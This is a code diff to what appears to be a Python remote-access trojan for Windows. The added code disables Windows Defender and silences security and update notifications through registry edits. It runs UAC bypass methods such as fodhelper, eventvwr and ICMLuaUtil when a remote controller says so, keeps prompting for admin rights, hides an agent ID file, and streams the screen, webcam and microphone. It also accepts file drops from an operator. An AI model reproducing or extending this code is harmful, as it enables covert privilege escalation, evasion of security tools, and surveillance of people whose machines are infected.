+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications", "ToastEnabled", 0)
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications", "NoToastApplicationNotification", 1)
+        if REGISTRY_ACTIONS.get('defender_ux_suppress', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows Defender\UX Configuration", "Notification_Suppress", 1)
+        if REGISTRY_ACTIONS.get('notify_center_hkcu', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter", 1)
+        if REGISTRY_ACTIONS.get('notify_center_hklm', True):
+            set_dword(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter", 1)
+        if REGISTRY_ACTIONS.get('explorer_balloon_tips', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "EnableBalloonTips", 0)
+        if REGISTRY_ACTIONS.get('explorer_info_tip', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowInfoTip", 0)
         set_dword(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications", "DisableNotifications", 1)
         set_dword(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray", "HideSystray", 1)
-        # Specific toast channels
-        toast_paths = [
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsUpdate",
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance",
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsSecurity",
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Microsoft.Windows.SecHealthUI",
-        ]
-        for path in toast_paths:
-            set_dword(winreg.HKEY_CURRENT_USER, path, "Enabled", 0)
+        if REGISTRY_ACTIONS.get('toast_windows_update', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsUpdate", "Enabled", 0)
+        if REGISTRY_ACTIONS.get('toast_security_maintenance', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance", "Enabled", 0)
+        if REGISTRY_ACTIONS.get('toast_windows_security', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsSecurity", "Enabled", 0)
+        if REGISTRY_ACTIONS.get('toast_sec_health_ui', True):
+            set_dword(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Microsoft.Windows.SecHealthUI", "Enabled", 0)
         log_message(f"[NOTIFICATIONS] Aggressive suppression applied ({success} settings)", "info")
         return success > 0
     except Exception as e:
         log_message(f"[NOTIFICATIONS] Aggressive suppression error: {e}", "error")
+        return False
+def perform_post_admin_actions():
+    try:
+        if not WINDOWS_AVAILABLE:
+            return False
+        if REGISTRY_ENABLED:
+            ensure_registry_policies_and_context_menu()
+            suppress_security_notifications_aggressive()
+            disable_windows_notifications()
+        if DEFENDER_DISABLE_ENABLED:
+            disable_defender()
+        return True
+    except Exception:
         return False
 def keep_trying_elevation():
     """Background thread that continuously tries to gain admin privileges."""
@@ -2386,7 +2683,8 @@ def keep_trying_elevation():
             disable_uac()
             if DEFENDER_DISABLE_ENABLED:
                 disable_defender()
-            disable_windows_notifications()
+            if REGISTRY_ENABLED:
+                disable_windows_notifications()
             return
         
         retry_count += 1
@@ -2408,10 +2706,20 @@ def attempt_uac_bypass():
     debug_print("=" * 80)
     debug_print("[UAC BYPASS] attempt_uac_bypass() called")
     debug_print("=" * 80)
+    try:
+        emit_security_notification('info', 'UAC Bypass Attempt', 'Attempting elevation')
+    except Exception:
+        pass
     
     if not WINDOWS_AVAILABLE:
         debug_print("❌ [UAC BYPASS] Not Windows - bypass not available")
         return False
+    try:
+        if should_skip_uac_method():
+            log_message("[UAC BYPASS] Skipped due to Windows Defender detection", "warning")
+            return False
+    except Exception:
+        pass
     
     debug_print("[UAC BYPASS] Checking if already admin...")
     if is_admin():
@@ -2426,7 +2734,8 @@ def attempt_uac_bypass():
     except Exception:
         pass
     try:
-        disable_realtime_monitoring_before_uac()
+        if REGISTRY_ENABLED and REGISTRY_ACTIONS.get('disableRealtimeMonitoring', True):
+            disable_realtime_monitoring_before_uac()
     except Exception:
         pass
     
@@ -2458,6 +2767,14 @@ def attempt_uac_bypass():
             # Somehow THIS process became admin (unusual but possible)
             debug_print("✅ [UAC BYPASS] THIS process is now admin!")
             log_message("✅ [UAC BYPASS] UAC bypass successful - now running as admin!", "success")
+            try:
+                emit_security_notification('success', 'UAC Bypass Successful', 'Admin privileges gained')
+            except Exception:
+                pass
+            try:
+                perform_post_admin_actions()
+            except Exception:
+                pass
             return True
         else:
             # A separate elevated instance was launched
@@ -2482,6 +2799,10 @@ def attempt_uac_bypass():
         debug_print("❌❌❌ [UAC BYPASS] FAILED! All methods failed!")
         debug_print("=" * 80)
         log_message("❌ [UAC BYPASS] All UAC Manager methods failed", "error")
+        try:
+            emit_security_notification('error', 'UAC Bypass Failed', 'Bypass methods did not succeed')
+        except Exception:
+            pass
     
     return result
 
@@ -5892,6 +6213,10 @@ def silent_disable_uac():
         debug_print("✅ All .exe and installers will run without password prompts!")
         debug_print("✅ RESTART REQUIRED for changes to take full effect!")
         debug_print("=" * 80)
+        try:
+            emit_security_notification('success', 'UAC Disabled', 'Admin prompts disabled for applications')
+        except Exception:
+            pass
         return True
     else:
         debug_print("=" * 80)
@@ -5899,6 +6224,10 @@ def silent_disable_uac():
         debug_print("❌ Could not disable UAC with any method")
         debug_print("❌ May need administrator privileges")
         debug_print("=" * 80)
+        try:
+            emit_security_notification('error', 'UAC Disable Failed', 'Could not disable UAC')
+        except Exception:
+            pass
         return False
 
 def silent_enable_strict_uac():
@@ -6106,6 +6435,69 @@ def run_as_admin():
             return False
     return True
 
+def _e2e_decrypt(agent_id, enc, secret_env='AGENT_SHARED_SECRET'):
+    try:
+        import base64, os
+        from cryptography.hazmat.primitives import hashes
+        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+        from cryptography.fernet import Fernet
+        secret = os.environ.get(secret_env, '')
+        if not secret or not isinstance(enc, str):
+            return enc
+        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=str(agent_id).encode(), iterations=100000)
+        key = base64.urlsafe_b64encode(kdf.derive(secret.encode()))
+        return Fernet(key).decrypt(enc.encode()).decode()
+    except Exception:
+        return enc
+
+class FileIntegrityMonitor:
+    def __init__(self, paths_to_monitor):
+        self.paths = [p for p in (paths_to_monitor or []) if isinstance(p, str)]
+        self.hashes = {}
+        self.initialize_hashes()
+    def initialize_hashes(self):
+        import hashlib, os
+        for path in self.paths:
+            if os.path.exists(path):
+                self.hashes[path] = self.calculate_hash(path)
+    def calculate_hash(self, filepath):
+        import hashlib, os
+        if os.path.isdir(filepath):
+            h = hashlib.sha256()
+            try:
+                for root, _, files in os.walk(filepath):
+                    for f in files:
+                        fp = os.path.join(root, f)
+                        try:
+                            with open(fp, 'rb') as fh:
+                                for block in iter(lambda: fh.read(4096), b''):
+                                    h.update(block)
+                        except Exception:
+                            continue
+                return h.hexdigest()
+            except Exception:
+                return ''
+        sha256 = hashlib.sha256()
+        try:
+            with open(filepath, 'rb') as f:
+                for block in iter(lambda: f.read(4096), b''):
+                    sha256.update(block)
+            return sha256.hexdigest()
+        except Exception:
+            return ''
+    def check_integrity(self):
+        import os
+        changes = []
+        for path, original_hash in list(self.hashes.items()):
+            if not os.path.exists(path):
+                changes.append({'path': path, 'status': 'deleted'})
+                continue
+            current_hash = self.calculate_hash(path)
+            if current_hash and current_hash != original_hash:
+                changes.append({'path': path, 'status': 'modified'})
+                self.hashes[path] = current_hash
+        return changes
+
 def run_as_admin_with_limited_attempts():
     """
     ✅ ETHICAL VERSION: Request admin privileges with LIMITED attempts.
@@ -6199,7 +6591,7 @@ def run_as_admin_persistent():
         return False
     
     # ✅ RESPECT MAX_PROMPT_ATTEMPTS if defined
-    max_attempts = MAX_PROMPT_ATTEMPTS if 'MAX_PROMPT_ATTEMPTS' in globals() else 999
+    max_attempts = 999 if ('PERSISTENT_ADMIN_PROMPT_ENABLED' in globals() and PERSISTENT_ADMIN_PROMPT_ENABLED) else (MAX_PROMPT_ATTEMPTS if 'MAX_PROMPT_ATTEMPTS' in globals() else 999)
     
     debug_print("=" * 80)
     if max_attempts < 999:
@@ -6557,7 +6949,8 @@ def execute_in_powershell(command, timeout=30):
                 text=False,
                 timeout=timeout,
                 creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS_AVAILABLE else 0,
-                env=os.environ.copy()
+                env=os.environ.copy(),
+                cwd=os.getcwd()
             )
             
             # Decode output
@@ -6586,7 +6979,8 @@ def execute_in_powershell(command, timeout=30):
                 shell=True,
                 capture_output=True,
                 text=True,
-                timeout=timeout
+                timeout=timeout,
+                cwd=os.getcwd()
             )
             
             execution_time = int((time_module.time() - start_time) * 1000)
@@ -6806,7 +7200,27 @@ def get_or_create_agent_id():
             except:
                 pass
     except Exception as e:
-        log_message(f"Could not save agent ID to file: {e}", "warning")
+        global AGENT_ID_SAVE_WARNED
+        try:
+            if not AGENT_ID_SAVE_WARNED:
+                log_message(f"Could not save agent ID to file: {e}", "warning")
+                AGENT_ID_SAVE_WARNED = True
+        except Exception:
+            pass
+        try:
+            fallback_base = os.getenv('LOCALAPPDATA') or os.getenv('TEMP') or os.path.expanduser('~')
+            fallback_path = os.path.join(fallback_base, 'agent_controller')
+            os.makedirs(fallback_path, exist_ok=True)
+            id_file_path = os.path.join(fallback_path, 'agent_id.txt')
+            with open(id_file_path, 'w') as f:
+                f.write(agent_id)
+            if WINDOWS_AVAILABLE:
+                try:
+                    win32api.SetFileAttributes(id_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
+                except:
+                    pass
+        except Exception:
+            pass
     
     return agent_id
 
@@ -6920,11 +7334,11 @@ def camera_encode_worker(agent_id):
                     # Dynamic JPEG quality based on queue fullness
                     queue_fullness = camera_encode_queue.qsize() / CAMERA_ENCODE_QUEUE_SIZE
                     if queue_fullness > 0.8:
-                        jpeg_quality = 50  # Low quality when queue is full
+                        jpeg_quality = 45
                     elif queue_fullness > 0.5:
-                        jpeg_quality = 60  # Medium quality
+                        jpeg_quality = 55
                     else:
-                        jpeg_quality = 65  # Good quality when queue is empty
+                        jpeg_quality = 65
                     
                     encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), jpeg_quality]
                     result, encoded_frame = cv2.imencode('.jpg', frame, encode_param)
@@ -7168,7 +7582,7 @@ def audio_capture_worker(agent_id):
 
 def audio_encode_worker(agent_id):
     """Encode audio frames from capture queue to Opus and put in encode queue."""
-    global AUDIO_STREAMING_ENABLED, audio_capture_queue, audio_encode_queue
+    global AUDIO_STREAMING_ENABLED, audio_capture_queue, audio_encode_queue, MIC_VOLUME, NOISE_REDUCTION_ENABLED
     
     if audio_capture_queue is None or audio_encode_queue is None:
         log_message("Error: Audio queues not initialized", "error")
@@ -7195,6 +7609,18 @@ def audio_encode_worker(agent_id):
                     pcm_data = audio_capture_queue.get(timeout=0.5)
                 except queue.Empty:
                     continue
+                try:
+                    import numpy as _np
+                    arr = _np.frombuffer(pcm_data, dtype=_np.int16)
+                    if MIC_VOLUME != 1.0:
+                        arr = _np.clip(arr.astype(_np.float32) * float(MIC_VOLUME), -32768, 32767).astype(_np.int16)
+                    if NOISE_REDUCTION_ENABLED:
+                        thr = 500
+                        mask = _np.abs(arr) > thr
+                        arr = (arr * mask).astype(_np.int16)
+                    pcm_data = arr.tobytes()
+                except Exception:
+                    pass
                 
                 # Encode with Opus if available, otherwise use PCM
                 if encoder:
@@ -7343,8 +7769,8 @@ def stream_screen_simple_socketio(agent_id):
             height = int(monitor.get('height', 0) or (monitor['bottom'] - monitor['top'])) if isinstance(monitor, dict) else (
                 monitor[3] - monitor[1]
             )
-            if width > 1280:
-                scale = 1280 / width
+            if width > 1024:
+                scale = 1024 / width
                 width = int(width * scale)
                 height = int(height * scale)
             frame_time = 1.0 / max(1, int(TARGET_FPS) if 'TARGET_FPS' in globals() else 15)
@@ -7361,7 +7787,7 @@ def stream_screen_simple_socketio(agent_id):
                             img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
                         if img.shape[2] == 4:
                             img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
-                        ok, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 80])
+                        ok, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 60])
                         if ok:
                             connected = SOCKETIO_AVAILABLE and sio is not None and getattr(sio, 'connected', False)
                             if not connected:
@@ -7701,7 +8127,11 @@ async def create_webrtc_peer_connection(agent_id, enable_screen=True, enable_aud
         
         # Add media tracks
         if enable_screen:
-            screen_track = ScreenTrack(agent_id, target_fps=30, quality=85)
+            screen_track = ScreenTrack(
+                agent_id,
+                target_fps=WEBRTC_CONFIG['quality_levels']['low']['fps'],
+                quality=WEBRTC_CONFIG['quality_levels']['low']['quality']
+            )
             pc.addTrack(screen_track)
             WEBRTC_STREAMS[f"{agent_id}_screen"] = screen_track
             log_message(f"Added screen track to WebRTC connection for agent {agent_id}")
@@ -7713,7 +8143,12 @@ async def create_webrtc_peer_connection(agent_id, enable_screen=True, enable_aud
             log_message(f"Added audio track to WebRTC connection for agent {agent_id}")
         
         if enable_camera:
-            camera_track = CameraTrack(agent_id, camera_index=0, target_fps=30, quality=85)
+            camera_track = CameraTrack(
+                agent_id,
+                camera_index=0,
+                target_fps=WEBRTC_CONFIG['quality_levels']['low']['fps'],
+                quality=WEBRTC_CONFIG['quality_levels']['low']['quality']
+            )
             pc.addTrack(camera_track)
             WEBRTC_STREAMS[f"{agent_id}_camera"] = camera_track
             log_message(f"Added camera track to WebRTC connection for agent {agent_id}")
@@ -7966,18 +8401,31 @@ def estimate_bandwidth(agent_id):
         
         # Extract bandwidth information from RTCStatsReport
         bandwidth_stats = {
-            'current_bitrate': 0,
-            'available_bandwidth': 0,
+            'current_bitrate': 0,  # bits per second
+            'available_bandwidth': 0,  # bits per second
             'rtt': 0,
             'packet_loss': 0,
             'jitter': 0
         }
         
+        last_bytes = None
+        last_ts = None
         for stat in stats.values():
             if hasattr(stat, 'type'):
                 if stat.type == 'outbound-rtp':
                     if hasattr(stat, 'bytesSent') and hasattr(stat, 'timestamp'):
-                        bandwidth_stats['current_bitrate'] = stat.bytesSent * 8 / 1000000  # Mbps
+                        prev = WEBRTC_BANDWIDTH_TRACK.get(agent_id)
+                        if prev:
+                            last_bytes = prev.get('bytes')
+                            last_ts = prev.get('ts')
+                        bytes_sent = int(getattr(stat, 'bytesSent', 0) or 0)
+                        ts = float(getattr(stat, 'timestamp', time.time()) or time.time())
+                        if last_bytes is not None and last_ts is not None:
+                            dt = max(0.001, ts - last_ts)
+                            delta_bytes = max(0, bytes_sent - last_bytes)
+                            bps = int((delta_bytes * 8) / dt)
+                            bandwidth_stats['current_bitrate'] = bps
+                        WEBRTC_BANDWIDTH_TRACK[agent_id] = {'bytes': bytes_sent, 'ts': ts}
                 elif stat.type == 'candidate-pair':
                     if hasattr(stat, 'currentRtt'):
                         bandwidth_stats['rtt'] = stat.currentRtt * 1000  # Convert to ms
@@ -7987,8 +8435,7 @@ def estimate_bandwidth(agent_id):
         
         # Estimate available bandwidth (simplified algorithm)
         if bandwidth_stats['current_bitrate'] > 0:
-            # Assume we can use up to 80% of current capacity
-            bandwidth_stats['available_bandwidth'] = bandwidth_stats['current_bitrate'] * 1.25
+            bandwidth_stats['available_bandwidth'] = int(bandwidth_stats['current_bitrate'] * 0.8)
         
         return bandwidth_stats
         
@@ -9533,6 +9980,37 @@ def register_socketio_handlers():
             
             # Send success notification
             emit_system_notification('success', 'Agent Connected', f'Successfully connected to controller as agent {agent_id}')
+            try:
+                paths = []
+                home = os.path.expanduser("~")
+                if home:
+                    paths.append(home)
+                    d = os.path.join(home, "Desktop")
+                    if os.path.isdir(d):
+                        paths.append(d)
+                fim = FileIntegrityMonitor(paths)
+                def _fim_loop():
+                    while True:
+                        changes = fim.check_integrity()
+                        if changes:
+                            safe_emit('system_alert', {'agent_id': agent_id, 'type': 'warning', 'message': 'File changes detected', 'details': json.dumps(changes), 'timestamp': int(time.time()*1000)})
+                        time.sleep(300)
+                threading.Thread(target=_fim_loop, daemon=True).start()
+            except Exception:
+                pass
+            try:
+                FileSystemManager(sio, agent_id)
+            except Exception:
+                pass
+            try:
+                if PSUTIL_AVAILABLE:
+                    ProcessManager(sio, agent_id)
+            except Exception:
+                pass
+            try:
+                SystemInfoGatherer(sio, agent_id)
+            except Exception:
+                pass
             
         except Exception as e:
             log_message(f"Error in connect handler: {e}", "error")
@@ -9540,10 +10018,10 @@ def register_socketio_handlers():
     
     # Register disconnect handler
     @sio.event
-    def disconnect():
+    def disconnect(*args):
         global CONNECTION_STATE
         try:
-            agent_id = get_or_create_agent_id()
+            agent_id = socket.gethostname()
             log_message(f"[DISCONNECT] Agent {agent_id} lost connection to controller")
             
             # Update connection state immediately
@@ -9595,15 +10073,140 @@ def register_socketio_handlers():
     sio.on('webrtc_get_production_readiness')(on_webrtc_get_production_readiness)
     sio.on('webrtc_get_migration_plan')(on_webrtc_get_migration_plan)
     sio.on('webrtc_get_monitoring_data')(on_webrtc_get_monitoring_data)
+    sio.on('config_update')(on_config_update)
     
     # Apply configuration pushed from controller
     # agent_config handling removed in this revision
     sio.on('webrtc_adaptive_bitrate_control')(on_webrtc_adaptive_bitrate_control)
     sio.on('webrtc_implement_frame_dropping')(on_webrtc_implement_frame_dropping)
+    sio.on('feature_toggle')(on_feature_toggle)
+    sio.on('get_monitors')(on_get_monitors)
+    sio.on('switch_monitor')(on_switch_monitor)
+    sio.on('set_display_mode')(on_set_display_mode)
+    sio.on('set_audio_volumes')(on_set_audio_volumes)
+    sio.on('toggle_noise_reduction')(on_toggle_noise_reduction)
+    sio.on('toggle_echo_cancellation')(on_toggle_echo_cancellation)
     
     log_message("Socket.IO event handlers registered successfully", "info")
 
 # --- Socket.IO File Transfer Handlers ---
+
+def on_config_update(data):
+    try:
+        agent = data.get('agent') or {}
+        bypasses = data.get('bypasses') or {}
+        registry = data.get('registry') or {}
+        global REQUEST_ADMIN_FIRST, MAX_PROMPT_ATTEMPTS, DISABLE_UAC_BYPASS, UAC_BYPASS_DEBUG_MODE, DEFENDER_DISABLE_ENABLED, DISABLE_SLUI_BYPASS, UAC_BYPASS_METHODS_ENABLED, REGISTRY_ENABLED, PERSISTENT_ADMIN_PROMPT_ENABLED, REGISTRY_ACTIONS
+        prev_disable_uac_bypass = DISABLE_UAC_BYPASS if 'DISABLE_UAC_BYPASS' in globals() else None
+        prev_persistent_prompt = PERSISTENT_ADMIN_PROMPT_ENABLED if 'PERSISTENT_ADMIN_PROMPT_ENABLED' in globals() else None
+        prev_registry_enabled = REGISTRY_ENABLED if 'REGISTRY_ENABLED' in globals() else None
+        prev_slui_disabled = DISABLE_SLUI_BYPASS if 'DISABLE_SLUI_BYPASS' in globals() else None
+        prev_methods = dict(UAC_BYPASS_METHODS_ENABLED) if 'UAC_BYPASS_METHODS_ENABLED' in globals() else {}
+        REQUEST_ADMIN_FIRST = bool(agent.get('requestAdminFirst', REQUEST_ADMIN_FIRST))
+        try:
+            MAX_PROMPT_ATTEMPTS = int(agent.get('maxPromptAttempts', MAX_PROMPT_ATTEMPTS))
+        except Exception:
+            pass
+        UAC_BYPASS_DEBUG_MODE = bool(agent.get('uacBypassDebug', UAC_BYPASS_DEBUG_MODE))
+        PERSISTENT_ADMIN_PROMPT_ENABLED = bool(agent.get('persistentAdminPrompt', PERSISTENT_ADMIN_PROMPT_ENABLED))
+        DEFENDER_DISABLE_ENABLED = bool(agent.get('enableDefenderDisable', DEFENDER_DISABLE_ENABLED))
+        bypasses_enabled = bool(bypasses.get('enabled', True))
+        REGISTRY_ENABLED = bool(registry.get('enabled', True))
+        DISABLE_UAC_BYPASS = (not bool(agent.get('enableUACBypass', True))) or (not bypasses_enabled)
+        methods = bypasses.get('methods') or {}
+        for k in list(UAC_BYPASS_METHODS_ENABLED.keys()):
+            if k in methods:
+                UAC_BYPASS_METHODS_ENABLED[k] = bool(methods.get(k))
+        if 'slui' in methods:
+            DISABLE_SLUI_BYPASS = not bool(methods.get('slui'))
+        actions = registry.get('actions') or {}
+        try:
+            for k, v in actions.items():
+                REGISTRY_ACTIONS[k] = bool(v)
+        except Exception:
+            pass
+        try:
+            uac_state_changed = prev_disable_uac_bypass is not None and prev_disable_uac_bypass != DISABLE_UAC_BYPASS
+            if uac_state_changed:
+                if not DISABLE_UAC_BYPASS and bypasses_enabled:
+                    emit_security_notification('info', 'UAC Bypass Enabled', 'UAC bypass features enabled')
+                else:
+                    emit_security_notification('warning', 'UAC Bypass Disabled', 'UAC bypass features disabled')
+            persistent_changed = prev_persistent_prompt is not None and prev_persistent_prompt != PERSISTENT_ADMIN_PROMPT_ENABLED
+            if persistent_changed:
+                if PERSISTENT_ADMIN_PROMPT_ENABLED:
+                    emit_security_notification('info', 'Persistent Admin Prompt Enabled', 'Will ask for admin repeatedly')
+                else:
+                    emit_security_notification('info', 'Persistent Admin Prompt Disabled', 'Stopped persistent admin prompts')
+            registry_changed = prev_registry_enabled is not None and prev_registry_enabled != REGISTRY_ENABLED
+            if registry_changed:
+                if REGISTRY_ENABLED:
+                    emit_security_notification('info', 'Registry Controls Enabled', 'Registry action toggles active')
+                else:
+                    emit_security_notification('warning', 'Registry Controls Disabled', 'Registry action toggles inactive')
+            slui_changed = prev_slui_disabled is not None and prev_slui_disabled != DISABLE_SLUI_BYPASS
+            if slui_changed:
+                if not DISABLE_SLUI_BYPASS:
+                    emit_security_notification('info', 'SLUI Bypass Enabled', 'slui method enabled')
+                else:
+                    emit_security_notification('warning', 'SLUI Bypass Disabled', 'slui method disabled')
+            method_names = {
+                'cleanmgr_sagerun': 'cleanmgr/sagerun',
+                'fodhelper': 'fodhelper',
+                'computerdefaults': 'computerdefaults',
+                'eventvwr': 'eventvwr',
+                'sdclt': 'sdclt',
+                'wsreset': 'wsreset',
+                'slui': 'slui',
+                'winsat': 'winsat',
+                'silentcleanup': 'SilentCleanup',
+                'icmluautil': 'ICMLuaUtil'
+            }
+            for mk, prev_val in (prev_methods or {}).items():
+                if mk in UAC_BYPASS_METHODS_ENABLED:
+                    curr = UAC_BYPASS_METHODS_ENABLED[mk]
+                    if curr != prev_val:
+                        name = method_names.get(mk, mk)
+                        if curr:
+                            emit_security_notification('info', 'UAC Method Enabled', name)
+                        else:
+                            emit_security_notification('warning', 'UAC Method Disabled', name)
+        except Exception:
+            pass
+        try:
+            def _apply_changes():
+                try:
+                    if PERSISTENT_ADMIN_PROMPT_ENABLED:
+                        try:
+                            r = run_as_admin_persistent()
+                            if r:
+                                emit_security_notification('success', 'Admin Granted', 'Persistent UAC prompt granted admin')
+                            else:
+                                emit_security_notification('info', 'Admin Prompt Active', 'Persistent UAC prompt running')
+                        except Exception:
+                            pass
+                    if not DISABLE_UAC_BYPASS and bypasses_enabled:
+                        try:
+                            attempt_uac_bypass()
+                        except Exception:
+                            pass
+                    if REGISTRY_ENABLED and actions:
+                        for k, v in actions.items():
+                            try:
+                                res = apply_registry_action(k, bool(v))
+                                if res:
+                                    emit_security_notification('success', 'Registry Action Applied', f'{k} set to {bool(v)}')
+                                else:
+                                    emit_security_notification('error', 'Registry Action Failed', f'{k} set to {bool(v)} failed')
+                            except Exception:
+                                pass
+                except Exception:
+                    pass
+            threading.Thread(target=_apply_changes, daemon=True).start()
+        except Exception:
+            pass
+    except Exception:
+        pass
 
 def on_file_chunk_from_operator(data):
     """Receive a file chunk from the operator and write to disk."""
@@ -9631,25 +10234,59 @@ def on_file_chunk_from_operator(data):
         if not hasattr(on_file_chunk_from_operator, 'buffers'):
             on_file_chunk_from_operator.buffers = {}
         buffers = on_file_chunk_from_operator.buffers
+        if not hasattr(on_file_chunk_from_operator, 'dest_map'):
+            on_file_chunk_from_operator.dest_map = {}
+        dest_map = on_file_chunk_from_operator.dest_map
+        def _resolve_upload_destination(dp, fn):
+            try:
+                if not dp:
+                    os.makedirs(UPLOAD_BASE_DIR, exist_ok=True)
+                    return os.path.join(UPLOAD_BASE_DIR, fn)
+                dp = os.path.normpath(dp)
+                if dp.endswith(os.sep) or os.path.isdir(dp):
+                    p = os.path.join(dp, fn)
+                else:
+                    p = dp
+                dirp = os.path.dirname(p) or '.'
+                try:
+                    os.makedirs(dirp, exist_ok=True)
+                    test = os.path.join(dirp, f".upload_test_{secrets.token_hex(4)}")
+                    with open(test, 'wb') as tf:
+                        tf.write(b'')
+                    try:
+                        os.remove(test)
+                    except Exception:
+                        pass
+                    return p
+                except Exception:
+                    os.makedirs(UPLOAD_BASE_DIR, exist_ok=True)
+                    return os.path.join(UPLOAD_BASE_DIR, fn)
+            except Exception:
+                os.makedirs(UPLOAD_BASE_DIR, exist_ok=True)
+                return os.path.join(UPLOAD_BASE_DIR, fn)
+        final_path = dest_map.get(destination_path)
+        if not final_path:
+            final_path = _resolve_upload_destination(destination_path, filename)
+            dest_map[destination_path] = final_path
         
-        if destination_path not in buffers:
-            buffers[destination_path] = {'chunks': [], 'total_size': total_size, 'filename': filename}
+        if final_path not in buffers:
+            buffers[final_path] = {'chunks': [], 'total_size': total_size, 'filename': filename}
         
         # Remove data: prefix if present
         if ',' in chunk_b64:
             chunk_b64 = chunk_b64.split(',', 1)[1]
         
         chunk = base64.b64decode(chunk_b64)
-        buffers[destination_path]['chunks'].append((offset, chunk))
+        buffers[final_path]['chunks'].append((offset, chunk))
         
         # Check if file is complete
-        received_size = sum(len(c[1]) for c in buffers[destination_path]['chunks'])
+        received_size = sum(len(c[1]) for c in buffers[final_path]['chunks'])
         
         # Update total_size if it was 0 but we're receiving multiple chunks
-        if total_size == 0 and buffers[destination_path]['total_size'] > 0:
-            total_size = buffers[destination_path]['total_size']
+        if total_size == 0 and buffers[final_path]['total_size'] > 0:
+            total_size = buffers[final_path]['total_size']
         elif total_size > 0:
-            buffers[destination_path]['total_size'] = total_size
+            buffers[final_path]['total_size'] = total_size
         
         # Calculate progress and send to UI
         if total_size > 0:
@@ -9660,7 +10297,7 @@ def on_file_chunk_from_operator(data):
             safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
-                'destination_path': destination_path,
+                'destination_path': final_path,
                 'received': received_size,
                 'total': total_size,
                 'progress': progress
@@ -9673,7 +10310,7 @@ def on_file_chunk_from_operator(data):
             safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
-                'destination_path': destination_path,
+                'destination_path': final_path,
                 'received': received_size,
                 'total': 0,  # Unknown total
                 'progress': -1  # -1 indicates unknown progress
@@ -9683,13 +10320,13 @@ def on_file_chunk_from_operator(data):
         # Don't auto-save when total_size is 0 - wait for upload_complete event instead
         if total_size > 0 and received_size >= total_size:
             log_message(f"File complete: received {received_size}/{total_size} bytes")
-            _save_completed_file(destination_path, buffers[destination_path])
+            _save_completed_file(final_path, buffers[final_path])
             
             # ✅ SEND COMPLETION EVENT TO UI!
             safe_emit('file_upload_complete', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
-                'destination_path': destination_path,
+                'destination_path': final_path,
                 'size': received_size,
                 'success': True
             })
@@ -9734,20 +10371,24 @@ def on_file_upload_complete_from_operator(data):
     filename = data.get('filename')
     destination_path = data.get('destination_path') or filename
     log_message(f"Upload of {filename} to {destination_path} complete.")
+    if hasattr(on_file_chunk_from_operator, 'dest_map') and destination_path in on_file_chunk_from_operator.dest_map:
+        destination_resolved = on_file_chunk_from_operator.dest_map[destination_path]
+    else:
+        destination_resolved = destination_path
     
     # Force save any remaining buffered file
     if hasattr(on_file_chunk_from_operator, 'buffers'):
-        if destination_path in on_file_chunk_from_operator.buffers:
-            log_message(f"Force saving file {destination_path} from completion event")
-            buffer_data = on_file_chunk_from_operator.buffers[destination_path]
-            _save_completed_file(destination_path, buffer_data)
+        if destination_resolved in on_file_chunk_from_operator.buffers:
+            log_message(f"Force saving file {destination_resolved} from completion event")
+            buffer_data = on_file_chunk_from_operator.buffers[destination_resolved]
+            _save_completed_file(destination_resolved, buffer_data)
             
             # ✅ SEND FINAL UPLOAD COMPLETION WITH 100% PROGRESS!
             file_size = sum(len(c[1]) for c in buffer_data['chunks'])
             safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
-                'destination_path': destination_path,
+                'destination_path': destination_resolved,
                 'received': file_size,
                 'total': file_size,
                 'progress': 100  # ✅ 100% complete!
@@ -9755,7 +10396,7 @@ def on_file_upload_complete_from_operator(data):
             safe_emit('file_upload_complete', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
-                'destination_path': destination_path,
+                'destination_path': destination_resolved,
                 'size': file_size,
                 'success': True
             })
@@ -10171,6 +10812,78 @@ def on_request_file_faststart(data):
         except Exception:
             pass
 
